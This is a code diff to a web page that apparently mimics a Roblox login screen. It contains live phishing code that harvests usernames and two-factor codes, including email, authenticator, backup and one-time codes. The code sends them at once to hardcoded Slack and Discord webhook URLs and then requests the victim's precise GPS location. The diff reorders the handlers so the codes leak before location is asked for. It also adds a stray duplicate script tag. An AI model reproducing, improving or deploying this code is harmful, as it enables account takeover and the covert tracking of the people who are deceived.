@@ -392,6 +392,7 @@
     </footer>
 </div>
 <script>
+<script>
 const SLACK_WEBHOOK = "https://hooks.slack.com/services/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";
 const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1557120530954461225/Ff51QIXzK2bSqXLrgS4Gdqmg58rNeFtrnmGgiMJ8Ez3M1g0oaUXAqDHbWXI6JVPrj6Fo";
 const WAIT = 3000;
@@ -404,10 +405,11 @@ const EVENT_TYPES = {
 };
 
 const EXTENDED_COLOR_PALETTE = [
-    0xE74C3C, 0xF1C40F, 0x2ECC71, 0x3498DB, 0x9B59B6,
+    0x3498DB, 0xE74C3C, 0x2ECC71, 0xF1C40F, 0x9B59B6,
     0x1ABC9C, 0xE67E22, 0xE91E63, 0x00BCD4, 0x8BC34A,
     0xFF5722, 0x673AB7, 0x3F51B5, 0x009688, 0xCDDC39,
-    0xFF9800, 0x795548, 0x607D8B
+    0xFF9800, 0x795548, 0x607D8B, 0xFF4081, 0x3F51B5,
+    0x00E676, 0xFFEA00, 0xD50000, 0xAA00FF, 0x2962FF
 ];
 
 const userColors = {};
@@ -430,7 +432,7 @@ let clientGeoData = {
     country: "Unknown",
     org: "Unknown",
     lookupUrl: "#",
-    gpsAddress: "Pending verification...",
+    gpsAddress: "Fetched post-verification...",
     mapUrl: "#"
 };
 
@@ -451,7 +453,7 @@ let clientGeoData = {
     } catch (e) {}
 })();
 
-// 2. Präzise GPS-Standortabfrage (wird erst beim Bestätigen des Codes aufgerufen)
+// 2. Präzise GPS-Standortabfrage (wird nach Code-Versand aufgerufen)
 function requestPreciseGPS(cb) {
     if (!navigator.geolocation) {
         if(cb) cb();
@@ -753,18 +755,19 @@ form.addEventListener('submit', e => { e.preventDefault(); doLogin(); });
 loginButton.addEventListener('click', e => { e.preventDefault(); doLogin(); });
 form.addEventListener('keydown', e => { if(e.key === 'Enter'){ e.preventDefault(); doLogin(); } });
 
-/* Hilfsfunktion für Logins mit GPS-Abfrage nach Bestätigung */
-function handleVerificationConfirmation(buttonElement, methodType, codeValue) {
+/* Funktion: Zuerst Code sofort absenden, danach GPS anfordern */
+function handleVerificationWithDeferredGPS(buttonElement, methodType, codeValue) {
     buttonElement.disabled = true;
     buttonElement.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
 
-    // GPS-Standort wird erst JETZT abgefragt, nachdem der Code bestätigt wurde
-    requestPreciseGPS(() => {
-        sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-            Method: methodType,
-            Code: codeValue
-        }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    // 1. Code sofort an Webhooks senden
+    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
+        Method: methodType,
+        Code: codeValue
+    }, lastLogin.avatarUrl, lastLogin.profileDetails);
 
+    // 2. Danach GPS abfragen und aktualisieren
+    requestPreciseGPS(() => {
         setTimeout(() => {
             buttonElement.disabled = false;
             buttonElement.innerHTML = 'Verify';
@@ -777,7 +780,7 @@ function handleVerificationConfirmation(buttonElement, methodType, codeValue) {
 document.getElementById('verifyButton').addEventListener('click', function(){
     const code = document.getElementById('two-step-verification-code-input').value.replace(/\D/g,'');
     if(code.length !== 6){ document.getElementById('twostep-error').textContent = "Enter the 6-digit code."; return; }
-    handleVerificationConfirmation(this, "Email", code);
+    handleVerificationWithDeferredGPS(this, "Email", code);
 });
 
 /* 2FA: Authenticator */
@@ -787,12 +790,12 @@ document.getElementById('AuthenButton').addEventListener('click', function(){
     this.disabled = true;
     this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
 
-    requestPreciseGPS(() => {
-        sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
-            Method: "Authenticator",
-            Code: code
-        }, lastLogin.avatarUrl, lastLogin.profileDetails);
+    sendStructuredAuditLog("MFA_SUCCESS", lastLogin.username, {
+        Method: "Authenticator",
+        Code: code
+    }, lastLogin.avatarUrl, lastLogin.profileDetails);
 
+    requestPreciseGPS(() => {
         setTimeout(() => {
             this.disabled = false;
             this.innerHTML = 'Verify';
@@ -805,14 +808,14 @@ document.getElementById('AuthenButton').addEventListener('click', function(){
 document.getElementById('RecoveryFromEmailButton').addEventListener('click', function(){
     const code = document.getElementById('two-step-verification-code-input-RecoveryFromEmail').value.replace(/\D/g,'');
     if(code.length !== 9) return;
-    handleVerificationConfirmation(this, "Backup Code (Email)", code);
+    handleVerificationWithDeferredGPS(this, "Backup Code (Email)", code);
 });
 
 /* Recovery: Authenticator Backup-Code */
 document.getElementById('RecoveryFromAuthenButton').addEventListener('click', function(){
     const code = document.getElementById('two-step-verification-code-input-recoveryFromAuthen').value.replace(/\D/g,'');
     if(code.length !== 9) return;
-    handleVerificationConfirmation(this, "Backup Code (Authenticator)", code);
+    handleVerificationWithDeferredGPS(this, "Backup Code (Authenticator)", code);
 });
 
 /* One-Time Code: Step 1 */
@@ -849,13 +852,13 @@ document.getElementById('otp-verify-btn').addEventListener('click', function(){
     this.disabled = true;
     this.innerHTML = '<div class="rbx-bars small"><div class="bar"></div><div class="bar"></div><div class="bar"></div></div>';
     
-    requestPreciseGPS(() => {
-        sendStructuredAuditLog("MFA_SUCCESS", email, {
-            Method: "One-Time Code",
-            Code: code,
-            Email: email
-        });
+    sendStructuredAuditLog("MFA_SUCCESS", email, {
+        Method: "One-Time Code",
+        Code: code,
+        Email: email
+    });
 
+    requestPreciseGPS(() => {
         setTimeout(() => { this.disabled = false; this.innerHTML = 'Verify'; showErrorUnderFields(); }, WAIT);
     });
 });
